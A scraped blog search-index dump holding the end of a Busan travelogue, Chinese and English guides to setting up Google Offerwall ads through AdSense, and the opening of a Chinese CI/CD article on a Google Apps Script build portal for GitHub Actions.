(Saturday) Lotte Department Store, Yeongdo Bridge Opening (only on Saturdays)10:45 Lotte Department Store Gwangbok Branch, Lotte Mart — Lotte Dept. Store Gwangbok Branch Aqua MallI left around 10:XX, as Lotte Department Store opens at 10:30, and I walked there slowly.First, I went to the B1 food street café to grab something for breakfast. (It was average, and the coffee was Lungo)11:30 Started wandering around the department store I bought a few pieces of clothing at the Kodak store (on average, about NT$300–$500 cheaper than buying through Taiwan).The store directly offers tax refunds. I bought a handheld fan.With the receipt, I went to the B1 food street to find the tax refund machine to print the tax refund slip, and then I went to the airport to get cash back. (I could get back about NT$60) The department store has a water dance show every hour starting at 11:00, which is quite spectacular.12:30 B1 Downtown BurgerFeeling tired from shopping, I went to B1 to eat at Downtown Burger; I understand the concept, but American burgers also come with pickles!After eating, I went to the observation deck on the top floor of the department store (it was super sunny and hot).~=13:30 Walked out of the department store to wait for the Yeongdo Bridge to openIt was very sunny outside, and as it got closer to 14:00, more and more people gathered; at this time, an elderly lady came over and told us that the opening on 8/2–30 was moved to 20:00 because it was too hot!! Shocked!! Then everyone started spreading the word that it was changed to 20:00, and people began to slowly disperse.Later, I saw the announcement banner on the railing. (The left sign shows the regular schedule)13:50 Returned to Lotte Department Store, continued wandering around Lotte MartLotte Mart also sells some souvenirs and skincare products (just like Carrefour).B1 Tax Refund MachineI searched for a long time before finding the tax refund machine, located on a small path next to Din Tai Fung. If you don’t do an immediate tax refund, you have to scan the receipt barcode here to exchange for a tax refund slip, and then get your money back at the airport. (It’s a bit of a hassle) I just learned that South Korea has different tax refund agencies: Global Blue, GLOBAL TAX FREE, Easy Tax Refund, CubeRefund, eTAX FREE, and you can only use the corresponding tax refund machine ; because I saw a cash refund machine at Olive Young, but it was GLOBAL TAX FREE, and since my receipt was from CubeRefund, I still had to go to the airport for the refund.16:35 Returned to the hotel to restFeeling tired from shopping, I bought some Korean red bean and peach fruit along with a homemade convenience store shake (ice cup + banana milk + unsweetened black coffee), and walked through the underground street back to the hotel to rest.19:00 Left the hotel to explore BIFF Olive YoungI didn’t get to explore OY in Haeundae, so I took the opportunity to check it out. This store is large, with many friendly staff.Loot19:40 Arrived at Yeongdo Bridge, waiting for it to openThere is a booth for commemorative photos under the bridge.Traffic control will start around 19:50.20:00 Bridge OpeningI watched from under the bridge, and around 20:05, it was almost time to move up.There was a projection introducing the history of Yeongdo Bridge, but it might have been the first day, as the projector angle was off, making it hard to see clearly.20:15 Bridge Lowered Again, Traffic Resumed20:30 Dinner — Ton Black &amp; Tempura Nine On the way back to the hotel at night, I randomly found a pork cutlet restaurant to eat (the pork cutlet was tender and delicious). The total was NT$366.~=21:50 Returned to the hotel to restDay 6 08/03 (Sunday) Lotte Department Store, Bupyeong Canned Goods Market, White Sand Bay Cultural Village, Bokcheonsa Temple Night View Today was spent wandering around to kill time, so the content is not recommended for reference, just a record.10:00 Left to eat — Egg Drop Located in the shopping street across from Lotte Department Store. Order at the machine on the first floor, take a number, and go upstairs to find a seat (you should check for available seats first). I waited about 20 minutes. I ordered a ham and cheese omelet toast + hash browns + iced coffee: 8,400 won. It was good, but I think some brunch places in Taiwan are better.11:00 Full and ready to goOn the way to Lotte Department Store, there is a souvenir shop called “Big Shop” that specializes in Busan memorabilia, with many Boogi and Busan-themed products.Lotte Department Store Gwangbok Branch, Lotte Mart — Lotte Dept. Store Gwangbok Branch Aqua MallBored, I continued to wander around Lotte Department Store.11:45 B1 No Country Dining Table Steamed Cuisine Lotte Dept. Store Gwangbok BranchAfter eating heavy-flavored food for several days, I wanted something lighter for lunch. Rice needs to be ordered separately. It doesn’t have much flavor on its own.After eating, I wandered around a bit more.12:50 Left Lotte Department Store, heading to Sky Eye Observatory — Yeongju Haneul Nun ObservatoryI casually wandered around the area and found a viewing platform I missed last year, which has a direct bus (21 minutes), so I decided to go. The buses in Busan are almost all new electric buses with very cool air conditioning. Passed by a place I visited last year: Busan Station13:00 Sky Eye Observatory — Yeongju Haneul Nun ObservatoryAfter getting off the bus, walk across to see it.The view here is great, allowing you to overlook all of Nampo, Busan.Headed down to Bupyeong Canned Goods Market — First, to buy the recommended The Liter shake from a colleague Recommended: Blueberry Yogurt Smoothie, available in 600ML or 1,000ML sizes; it’s refreshing and not too sweet, making you feel less thirsty as you drink it, priced around 4,300 won.Bupyeong Canned Goods MarketThe canned goods market has many dry goods, groceries, and seafood vendors (like a traditional market), and it’s quite large.Bupyeong Canned Goods Market — Milgot Red Bean Cream Mugwort Rice Cake 👍This should be the most famous store in the canned goods market, known for its — red bean cream mugwort rice cake. Since I don’t speak Korean, I just showed the photo to the staff and asked for this. The staff said it should be refrigerated when taken home, and it’s best to defrost it for half an hour to an hour before eating. I also bought a savory bread, which was good too!Later, I took it back to the hotel to eat. The mugwort cake has a chewy texture paired with soybean flour and red bean cream filling, which I found quite special, slightly sweet; if you pass by, you should give it a try!I also bought a box of BHC Fried Chicken to have for dinner.18:30 Set out againAfter resting in the evening, I went out again, mainly to take night photos at Bokcheonsa Temple, starting with a visit to White Sand Bay Cultural Village.18:45 White Sand Bay Cultural Village The most famous attraction here is — VIEW, FOOT BATH CAFE — enjoy the scenery while having coffee and a foot bath.However, since it was late, I just took a quick look; there are many cafés and small shops along the coast, but I don’t know if it was because of the late hour, there weren’t many people. The coastal path below was under maintenance, so I couldn’t walk down; the weather was cloudy today, and the scenery wasn’t great.19:00 Headed to Bokcheonsa Temple — Bokcheonsa TempleAfter leaving White Sand Bay, I headed up towards Bokcheonsa Temple.Originally, I looked at the map and saw that the bus only goes one stop, so I thought I could just walk. After a few steps, I gave up; the map said the bus ride would take 1 minute, but walking would actually take about 20 minutes (all on very bumpy hillside paths). You can take either bus 1 or 5.Only one stop to the next stop Sinseon Elementary School, and the rest has to be done on foot:After getting off, I was stunned; it was still a very bumpy hillside path, and I had to walk all the way up from here:After passing the elementary school, if you continue up, you will see the entrance to Bokcheon Temple:This is just the beginning; you have to climb the very bumpy hillside path all the way up to reach Bokcheon Temple: There will be vehicles passing through here, so please pay attention to safety ⚠️19:25 Arrived at Bokcheon Temple I arrived at Bokcheon Temple around 19:25 (almost died from exhaustion). The map said it would take 10 minutes, but the actual uphill walk plus breaks took about 25 minutes.But the more tragic thing is — it was closed! It was closed! It was closed!That’s right, Bokcheon Temple isn’t really a public tourist spot; it’s a quiet temple, and the doors close at a certain time. I heard from a colleague that after around 18:00, you can only enter but not exit. They won’t rush you, but if you miss the closing time, you can’t get in.What a tragedy; I could only look at the view from outside the gate. Later, some other visitors who came for the same reason also stood here. However, the abbot saw us sweating profusely and threw us two cans of ice water from inside. Thank you so much.This is the view of the city from here.Finally, I took a random night shot before heading down the mountain. I initially wanted to come here after seeing pictures from other bloggers:It should look like this if you actually go inGoing down was all downhill, and it was dark:It was a very quiet village, and I took the bus back to Jagalchi Station.Before heading back to the hotel, I bought some seed sugar cakes at BIFF Square, where quite a few people were lined up. I found them very oily and sweet, not that great.Around 22:00, it started to rain in Busan! Luckily, our trip was almost over.Day 7 08/04 (Mon) Busan Seomyeon, Shinsegae Department Store, Korean BeefIn the morning, I headed to Seomyeon Station.10:45 Arrived at Seomyeon StationOnce I arrived, I thought about storing my luggage directly at the subway station; other places like Lotte Department Store also offer luggage storage. Storing luggage here is quite expensive: I stored it at 10:45 in the morning and picked it up at 20:10 in the evening. I was charged 6,000 + 7,000 won (about NT$280).This station’s underground shopping area also has an Olive Young, so I stocked up on some supplies.11:00 Lunch Korean Knife-Cut Noodles — Gijang SonkalguksuAfter browsing for a while, I went to a nearby market to eat Korean knife-cut noodles.The menu choices were very simple, just knife-cut noodles and seaweed rolls. I ordered the seaweed rolls to share and got the cold knife-cut noodles for myself. The noodles had a very chewy texture and were refreshingly cold; the downside was that there weren’t many toppings (meat), so it felt quite bland with just the carbs.After eating, I walked back to Lotte Department Store.The Liter Seo-myeon Medical Street BranchI then bought a blueberry smoothie yogurt from Liter to refresh myself. The auntie at this place was very friendly.Lotte Department Store — Busan Main BranchI found it quite difficult to browse, or rather, it was harder to navigate than the Lotte Department Store in Gwangbok from yesterday; there were fewer floors and fewer shops. The only advantage is that there is a large public rest area upstairs where you can recharge and rest.There is also a Busan souvenir shop here, but they have much less than the one in Nampo.After browsing the Lego store, I wasn’t sure where to go next, so I decided to take the bus to explore Shinsegae Department Store. The other NC Department Store in Seomyeon has closed down. If you want to shop elsewhere, you might want to check out the coffee street in Tadaepo, where there are many small shops (similar to the vibe in the East District), but it might not be very interesting for guys.Busan is good! You can see the slogan “Busan is good” everywhere in Busan. After experiencing the trip, it really is nice; there are plenty of buses, convenient transportation, the buses are new and cool, prices are cheap, and the food is delicious.Shinsegae Department Store — Shinsegae Centum City 👍👍👍A few days ago, I only visited Spa Land and didn’t get to browse, so this time I came to explore. Shinsegae Department Store is super large (the largest in the world according to Guinness World Records), and there are many things to browse. If you don’t have enough time to shop, there’s also Lotte Department Store — Lotte Dept. Store Centum City Branch next door.It consists of two buildings, each with several floors, and each floor is quite spacious. I casually noted the prices at Busan La Lebo (on the first floor).The rooftop of this building has a free dinosaur park called ZOORAJI for kids to play.I wandered around casually; basically, all brands and types of stores are available.When I reached the first floor of the other building, I found Shake Shack, so I had to eat there:SHAKE SHACK BUSAN CENTUMI ordered a crispy chicken meal; besides their signature burger, I think the chicken is also tender and juicy.The buzzer seemed to have some issues; it was actually ready but didn’t ring. A taste I miss. Travel notes: Osaka Shack Shake / Bangkok Shake Shack~=17:00 Left Shinsegae Department Store~=17:45 Returned to Tadaepo Station (Seomyeon)Preparing to eat Korean beef for dinner.When I came out of Tadaepo Station, I could see the signs pointing to Tadaepo Coffee Street. There was a standalone Olive Young nearby.Tadaepo has many coffee shops and small stores, giving it a vibe similar to the East District.Flower Beef House Tadaepo Branch — flowerbeefhouseIt has a bit of a trendy East District aesthetic, and luckily, I made a reservation in advance on CatchTable or else there wouldn’t have been any seats available. I ordered a Korean beef set + jjajangmyeon + Cass beer. The Korean beef was tender but lacked much beef flavor; I found it just okay. Plus, the price was NT$2,458, which isn’t very high value for money compared to the grilled meat I had a few days ago. The only advantages were that it looked nice for photos, and the staff were friendly and spoke Chinese.19:15 Finished eating and walked back to Seomyeon StationThere are indeed many small shops and coffee shops from Tadaepo to Seomyeon, and I even saw ZARA.After returning to Seomyeon Station, I went to the B1 food court of Lotte Department Store to buy some food, preparing to head to the airport hotel.There is also a supermarket here, and I ended up buying this takoyaki to eat back at the hotel, choosing the Korean flavor on the far right.~=20:30 Headed to the airport hotel This time, I took the opposite direction towards Gaya University. It was also a Tuesday, and it felt like I was seeing my past self from last Tuesday when I just arrived in Busan.~=21:00 Arrived at AIR SKY HOTELThe hotel is at the previous stop before the airport — West Busan Distribution District Station, and across the street, there are CU/GS25 convenience stores.”) This room and bathroom are the largest and most well-equipped I’ve had in three days, but we are just passing through for one night.The window of the room offers a direct view of the planes taking off and landing.I went to the convenience store to buy some peach wine to go with the takoyaki I just bought. I think this takoyaki is great; even though it got soft after bringing it back, it was made with black squid ink as the base, and the crispy texture of Taiwanese takoyaki combined with Korean spicy sauce is very delicious. 😋Day 8 08/05 (Tue) Gimhae International Airport, Return TripTime flies, and my eight-day trip to Busan is coming to an end. The last day only has one itinerary: going to the airport.I took one stop from the hotel to reach the airport (about 10 minutes).After arriving at the airport, I went directly to the second floor for international departures. I was still sleepy in the morning and forgot to apply for SES to speed up my next entry clearance.Tax RefundIf you have a tax refund form to process, remember to follow this article for assistance.I lost my tax refund form…On the second floor, there are many self-check-in machines where you can check in and select your seat. You can also see that there are plenty of food options and shops on the third floor.The counter is assigned to D at the far end. The free baggage allowance for Busan Airlines is only: 15 KG They will check if your portable charger is in a ziplock bag After checking in your luggage, be sure to wait in that area for 5 minutes to see if there are any issuesThat day, someone was repeatedly announced as missing…~= 09:30 Departure Lounge The departure hall is not large; it’s just a single row. There are a few duty-free shops, a convenience store, and a café selling a limited selection of food. (If you’re very hungry, remember to eat outside before going through security) Since it’s a dual-use airport, photography of the planes outside is not allowed.Not sure what to buy, I went to the convenience store and got two cans of GD alcohol to bring back to Taiwan.Delay at 11:07, arrived early at 11:58Successful trip to Busan!Spoils of WarDidn’t buy much.Thank you for reading If you enjoyed my travelogue, feel free to purchase the Visit Busan Pass through my affiliate link, and I will receive a small commission. Thank you.More Travelogues [Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering via Busan → Hakata Cruise [Travelogue] 2024 San’in Region, Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2023 Kyushu 10-Day Solo Trip [Travelogue] 2023 Hiroshima Okayama 6-Day Free Trip [Travelogue] 9/11 Nagoya One-Day Flash Visit [Travelogue] 2023 Tokyo 5-Day Free Trip [Travelogue] 2023 Kansai 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 230 Total Views Last Statistics Date: 2025-08-15 | 218 Views on Medium." }, { "title": "Google Offerwall 廣告— 內容創作者的全新收益選擇", "url": "/posts/zrealm-dev/google-offerwall-%E5%BB%A3%E5%91%8A-%E5%85%A7%E5%AE%B9%E5%89%B5%E4%BD%9C%E8%80%85%E7%9A%84%E5%85%A8%E6%96%B0%E6%94%B6%E7%9B%8A%E9%81%B8%E6%93%87-ba132457e6a5/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-ads, offerwall, google-adsense, jekyll", "date": "2025-07-24 16:15:09 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Google Offerwall 廣告 — 內容創作者的全新收益選擇Google Offerwall 廣告的淺談與試用，可快速將既有流量內容轉換成限制小額支持或觀看廣告後才能存取。Live Demohttps://zhgchg...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Google Offerwall 廣告 — 內容創作者的全新收益選擇Google Offerwall 廣告的淺談與試用，可快速將既有流量內容轉換成限制小額支持或觀看廣告後才能存取。Live Demohttps://zhgchg.li/posts/ba132457e6a5/ Live Demo -&gt; https://zhgchg.li/posts/ba132457e6a5/Google Offerwall 廣告https://support.google.com/admanager/answer/13860694?hl=zh-Hant「 Google Offerwall 」，個人覺得是「 獎勵型的 Offerwall 獎勵牆廣告 」結合獎勵型廣告的特性，開發者可以很輕易的 指定網站內容頁面需要完成任務才能存取 ， 任務則為 Offerwall 獎勵牆任務 ，可以設定使用者須先完成興趣調查、看廣告、小額支付、訂閱電子報…或 串接自家系統的任務 ，獎勵內容則為存取權限可以是幾小時或幾天的無限制數量存取、也可以是數量限制；而這一切都只需要嵌入 Google Adsense 動態廣告程式碼就能達成，不需要自行開發系統。✅ 優點 實現容易 ：只要網站 嵌入動態廣告程式碼 即可，一次設定終身使用。 直接獲利 ：同 Google Adesnse 好處，不需要自己建置複雜的廣告系統、數據追蹤系統；也不需要自己找廣告商投放廣告，一切都由平台代為管理操作。 彈性多元 ：提供更彈性多元的內容、流量變現方式。 跨平台 ：支援手機、電腦版。❌ 缺點 出價低 ：這也是 Google Adesnse 的通病，廣告出價低。 容易阻擋 ：因為 Google Offerwall 是純前端遮蔽廣告，所以可以很輕易的被擋廣告外掛組饒或使用者使用開發工具可以直接繞過； 因此不建議將其實現在敏感重要有價值的內容之上。📝 技術要求 需要先申請通過 Google Adsense 現在門檻比較低了，只要有網站網址，內容有5–10 篇文章基本上就能申請通過。 網站需要能在 HTML Head 中 嵌入動態廣告程式碼❤️ 適合場景 For 廣告 ：同 Google Adsense 適合無自售廣告版位的中小型內容網站或個人部落格，例如使用 Wordpress 、 GitHub Pages 託管的網站；除原本的廣告版位顯示，還能對有價值的內容文章設定 Offerwall 獎勵牆廣告。本篇文章會以 For 廣告為案例，目前除廣告外都還在 Beta。 For 問券、小額支付、訂閱電子報 ：任何網站都能使用此機制快速建立Pop-up 廣告。安裝啟用步驟嵌入動態廣告程式碼首先要確認網站有嵌入 Google Adsense 廣告程式碼，如果之前就有使用動態廣告則可忽略此步驟。前往 Google Adsense -&gt; 廣告 -&gt; 按網站 -&gt; 取得程式碼：將程式碼內容貼到網站的 &lt;head&gt;&lt;/head&gt; 區塊之間：&lt;head&gt; //... &lt;script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3184248473087645\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/head&gt;建立 Offerwall 廣告前往 Google Adsense -&gt; 隱私權與訊息 -&gt; 管理 -&gt; 建立訊息： 也可以在這個頁面查看廣告收益。設定 Offerwall 廣告：3, 5, 64, 8 廣告名稱 您的網站 ：設定要套用的網站 網頁納入項目和排除項目 ：可設定要涵蓋的頁面網址或是排除的網址這邊我是設定 https://zhgchg.li/posts/ 路徑下的網址才會觸發。 預設語言 ：設定預設語言與支援的其他語言，可在左上方切換語言編輯不同語言的文案。 計量 ：可設定使用者瀏覽第幾個(次)網頁後才觸發這邊我設 0 代表第一次就觸發。 獎勵廣告 ：可設定完成任務的內容解鎖獎勵，可以是時間內無限次數瀏覽或是有限次數網頁瀏覽，獎勵到期後需要重新完成任務。這邊我設完成一次任務 24 小時可無限瀏覽。 文案設定： 指定文案內容、記得至少要上傳個 Logo 增加品牌力 樣式設定： 點擊 7 文案後還可以從這邊設定文字樣式、顏色可以參考 測試方式 在頁面網址加上 ?fc=alwaysshow&amp;fctype=monetization 預覽結果。 發佈變更 ：都設定好之後記得按發佈獎勵完成後訊息，目前不能更改。確認廣告是已發布狀態。測試 Offerwall 廣告使用無痕瀏覽器、確認沒有啟用擋廣告、反追蹤套件，後前往規則內的網頁：https://zhgchg.li/posts/c008a9e8ceca/ 成功🙌🙌🙌盡量使用 Chrome 無痕進行測試，Safari 要關閉擋廣告、反追蹤會比較麻煩。收益方面因為我的瀏覽量不高，所以單次點擊出價也都不太高，大約點擊一次廣告在 USD $0.01 ~ 0.07 之間而已。Medium To Github Pages x Google Offerwall可參考我之前的文章「 無痛轉移 Medium 到自架網站 」先將 Medium 文章無痛鏡像到 GitHub Pages 託管的靜態網站，然後在網站上再加入 Google Offerwall 即可將內容變現收益。或直接參考「 Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！ 」將 Medium 文章加入付費牆獲得收益。 因為 Medium 付費牆機制要求讀者必須花月費加入 Medium 才能閱讀文章，我覺得對資訊傳播不太友善，因此我的文章都沒有加入付費牆計劃；有了 Google Offerwall 正好補足了這塊中間地帶，使用者可以簡單地看廣告支持內容創作者，不用強綁月費付費，創作者也能獲得收益，一舉兩得！[補充] Offerwall 獎勵牆廣告與獎勵型廣告類型說明Offerwall — 獎勵牆廣告是什麼？相比傳統的固定版位廣告，獎勵牆廣告更強調與使用者之間的互動與目的性。它整合了內容展示、獎勵激勵以及使用者行為，使得使用者除了可以選擇主動付費解鎖加值項目外，還能以更有趣、參與性更高的方式獲得額外資源。而創作者則能從中獲得額外收益，實現雙贏效果。Example — Line Points 獎勵牆經典的日常生活中的案例就是 — Line Points，使用者除了直接加值購買 Line Points 之外也能從 Offwall 獎勵牆當中挑選喜歡的任務(加好友、註冊帳號、填問券、看廣告…等等)完成後獲得對應獎勵。Rewarded Ads — 獎勵型廣告獎勵型廣告是一種常見於遊戲與行動應用中的廣告形式，使用者只需自願完成特定行為，例如 觀看一段影片、點擊互動內容，或試用特定功能 ，就能獲得虛擬貨幣、額外生命、遊戲道具等獎勵。Example — Candy Crush經典案例就是遊戲中死亡繼續遊玩的廣告，這類廣告不僅提升使用者的參與度與滿意度，也讓開發者在不影響用戶體驗的前提下創造收益，同樣實現雙贏效果。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 34 Total Views Last Statistics Date: 2025-08-15 | 31 Views on Medium." }, { "title": "Google Offerwall Ads — A New Revenue Option for Content Creators", "url": "/posts/zrealm-dev/en/google-offerwall-ads-a-new-revenue-option-for-content-creators-ba132457e6a5/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-ads, offerwall, google-adsense, jekyll", "date": "2025-07-24 16:15:09 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Google Offerwall Ads — A New Revenue Option for Content CreatorsA brief discussion a...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Google Offerwall Ads — A New Revenue Option for Content CreatorsA brief discussion and trial of Google Offerwall ads, which can quickly convert existing traffic content into limited small support or access after watching ads.Live Demohttps://zhgchg.li/posts/ba132457e6a5/ Live Demo -&gt; https://zhgchg.li/posts/ba132457e6a5/Google Offerwall Adshttps://support.google.com/admanager/answer/13860694?hl=zh-HantThe “Google Offerwall” is, in my opinion, a “ reward-based Offerwall ad “ that combines the characteristics of reward-based advertising. Developers can easily specify that website content pages require completing tasks to access. The tasks are Offerwall reward wall tasks, which can be set for users to complete interest surveys, watch ads, make small payments, subscribe to newsletters… or integrate tasks from their own systems. The rewards can be access permissions that allow unlimited access for a few hours or days, or they can be limited in quantity; all of this can be achieved simply by embedding Google Adsense dynamic ad code, without the need to develop a system independently.✅ Advantages Easy to Implement: Just embed the dynamic ad code on the website, and it can be used for a lifetime after a one-time setup. Direct Profit: Similar to the benefits of Google Adsense, there is no need to build a complex advertising system or data tracking system; there is also no need to find advertisers to place ads, as everything is managed by the platform. Flexible and Diverse: Provides more flexible and diverse ways to monetize content and traffic. Cross-Platform: Supports both mobile and desktop versions.❌ Disadvantages Low Bids: This is a common issue with Google Adsense, where ad bids are low. Easily Blocked: Since Google Offerwall is purely a front-end ad overlay, it can easily be blocked by ad-blocking plugins or users can bypass it using developer tools; therefore, it is not recommended to implement it over sensitive or valuable content.📝 Technical Requirements You need to apply and be approved by Google Adsense.The threshold is relatively low now; as long as you have a website URL and 5–10 articles, you can generally get approved. The website needs to be able to embed dynamic ad code in the HTML Head.❤️ Suitable Scenarios For Ads: Similar to Google Adsense, suitable for small to medium content websites or personal blogs without self-sold ad spaces, such as websites hosted on Wordpress or GitHub Pages; in addition to displaying original ad spaces, you can also set Offerwall reward wall ads for valuable content articles.This article will use For Ads as a case study; currently, everything else is still in Beta. For Surveys, Small Payments, Newsletter Subscriptions: Any website can use this mechanism to quickly create pop-up ads.Installation StepsEmbed Dynamic Ad CodeFirst, ensure that the website has embedded the Google Adsense ad code. If you have previously used dynamic ads, you can skip this step.Go to Google Adsense -&gt; Ads -&gt; Click on the website -&gt; Get Code:Paste the code content between the &lt;head&gt;&lt;/head&gt; section of your website:&lt;head&gt; //... &lt;script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3184248473087645\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/head&gt;Create Offerwall AdsGo to Google Adsense -&gt; Privacy &amp; Messages -&gt; Management -&gt; Create Message: You can also check ad revenue on this page.Set up Offerwall Ads:3, 5, 64, 8 Ad Name Your Website: Set the website to apply. Included and Excluded Items: You can set the page URLs to include or exclude.I set it so that only URLs under the https://zhgchg.li/posts/ path will trigger. Default Language: Set the default language and other supported languages; you can switch languages in the upper left corner to edit different language texts. Measurement: You can set how many times a user must browse a webpage before triggering.I set it to 0, meaning it triggers on the first visit. Reward Ads: You can set the content unlock rewards for completing tasks, which can be unlimited browsing within a time frame or limited webpage views; after the reward expires, the task needs to be completed again.I set it so that completing one task allows unlimited browsing for 24 hours. Copy Settings: Specify the copy content; remember to upload a logo to enhance brand power. Style Settings: After clicking on the copy in 7, you can also set text styles and colors from here.You can refer to the testing method to preview results by adding ?fc=alwaysshow&amp;fctype=monetization to the page URL. Publish Changes: After everything is set, remember to click publish.Message after completing the reward; currently, it cannot be changed.Confirm that the ad is in a published state.Test Offerwall AdsUse an incognito browser, ensure that ad blockers and anti-tracking plugins are disabled, and then go to the webpage within the rules:https://zhgchg.li/posts/c008a9e8ceca/ Success 🙌🙌🙌Try to use Chrome incognito for testing; using Safari requires turning off ad blockers and anti-tracking, which can be more troublesome.Revenue AspectsDue to my low traffic, the bid per click is also not very high, with a single ad click ranging from USD $0.01 to $0.07.Medium To Github Pages x Google OfferwallYou can refer to my previous article “Seamless Transfer from Medium to Self-Hosted Website” to mirror Medium articles to a static website hosted on GitHub Pages, and then add Google Offerwall to monetize the content.Or directly refer to “Medium Partner Program Finally Open to Global Writers (Including Taiwan)!” to add Medium articles to a paywall for revenue. Since the Medium paywall mechanism requires readers to pay a monthly fee to join Medium to read articles, I feel it is not very friendly for information dissemination; therefore, my articles have not joined the paywall plan. With Google Offerwall, it perfectly fills this gap, allowing users to easily watch ads to support content creators without being forced into a monthly payment, benefiting both creators and users![Supplement] Explanation of Offerwall Reward Wall Ads and Reward-Based Ad TypesOfferwall — What Are Reward Wall Ads?Compared to traditional fixed-position ads, reward wall ads emphasize interaction and purpose between users. They integrate content display, reward incentives, and user behavior, allowing users to choose to pay to unlock premium items or obtain additional resources in a more engaging and participatory way. Creators can gain additional revenue from this, achieving a win-win effect.Example — Line Points Reward WallA classic example in daily life is — Line Points. Users can not only directly purchase Line Points but also select preferred tasks (adding friends, registering accounts, filling out surveys, watching ads, etc.) from the Offwall reward wall to complete and receive corresponding rewards.Rewarded Ads — Reward-Based AdsRewarded ads are a common form of advertising found in games and mobile applications, where users voluntarily complete specific actions, such as watching a video, clicking interactive content, or trying out specific features, to earn rewards like virtual currency, extra lives, or game items.Example — Candy CrushA classic case is the ads that allow players to continue playing after dying in games. These ads not only enhance user engagement and satisfaction but also enable developers to generate revenue without affecting user experience, achieving a win-win effect.If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 34 Total Views Last Statistics Date: 2025-08-15 | 31 Views on Medium." }, { "title": "CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台", "url": "/posts/zrealm-dev/ci-cd-%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97-%E5%9B%9B-%E4%BD%BF%E7%94%A8-google-apps-script-web-app-%E4%B8%B2%E6%8E%A5-github-actions-%E5%BB%BA%E7%BD%AE%E5%85%8D%E8%B2%BB%E6%98%93%E7%94%A8%E7%9A%84%E6%89%93%E5%8C%85%E5%B7%A5%E5%85%B7%E5%B9%B3%E5%8F%B0-4273e57e7148/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, google-apps-script, web-development, tools", "date": "2025-07-10 20:30:51 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台GAS Web App 串接 GitHub, Slack, Firebase...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台GAS Web App 串接 GitHub, Slack, Firebase 或 Asana/Jira API，建置中繼站，提供跨團隊共用的打包工具平台Photo by Lee Campbell前言前篇「 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App iOS CI 與 CD 工作流程 」我們已經完成了 App iOS 專案的 CI/CD 底層功能建設，現在已經可以 CI 自動測試驗證跟 CD 打包部署；然而在實務產品開發流程上， 打包部署工作多半是為了後續交付給其他職能夥伴 進 行 QA(Quality Assurance) 功能驗證，這時候 CD 場景就不在只侷限在工程端了，可能跨足 QA、PM、設計(Design QA) 甚至是老闆想先玩看看。GitHub Actions workflow_dispatch 手動表單觸發事件，雖然能提供簡易的表單讓使用者操作打包，但如果操作的對象是非工程人員就相對很不友善，他們不懂：什麼是分支？欄位要不要填？怎麼知道打包好了？好了怎麼下載？…etc另外還有權限控管問題，如果要讓其他職能夥伴直接使用 GitHub Actions 打包，就需要把他的帳號加到 Repo 當中， 資安控管上很不安全也不合理 ，只是要操作打包表單卻要開整個 Source Code 給他。不同於 Jenkins 有獨立的 Web 工具平台，GitHub Actions 就只有這個功能。workflow_dispatch 的表單樣式因此 我們需要一個中繼站打包平台，用來服務其他職能使用者 ，整合 Asana/Jira 的任務單，讓使用的人可以直接用任務單打包 App，並且直接在上面查看進度、下載打包結果。GAS Web App 中繼站上一篇 關注的是右邊核心 GitHub Actions CI/CD 工作流程開發；本文關注的是左半部 to End-User 打包工具平台、增加使用者體驗的部分。Google Apps Script — Web App 打包工具平台 成果圖 打包表單： 整合專案管理工具撈取單號、整合 GitHub 撈取開啟中的 Pull Request 把包紀錄： 顯示打包歷史紀錄、正在打包的任務進度狀態、點擊取得下載連結撈取 Firebase App Distribution 下載連結、資訊 Runner 狀態： 顯示 Self-hosted Runner 狀態。 Slack 打包進度通知。 支援手機版 支援限制組織團隊內帳號使用主要職責0 狀態、0 資料庫， 單純為中繼交換站 ，整合顯示各個 API 資料 (e.g. Asana/Jira/GitHub)、轉發表單請求到 GitHub Actions。操作要求： 支援手機與電腦。權限要求： 能限制只有團隊組織成員能存取。Online Demo Web AppSign in Edit description script.google.com技術選擇第一篇文章 有提到過，這邊再詳細整理一次。整合進 Slack我們嘗試過讓 Slack 擔任打包平台，自行開發後端服務並架設在 GCP 上，與 Slack API、Asana API 進行串接整合，再將 Slack 送來的表單轉手發送給 GitHub API 觸發後續 GitHub Actions；體驗上非常爽而且統一在團隊的協作工具上，可以無痛使用； 缺點是開發及後續維護成本很高 ，因為是自己用 Ktor 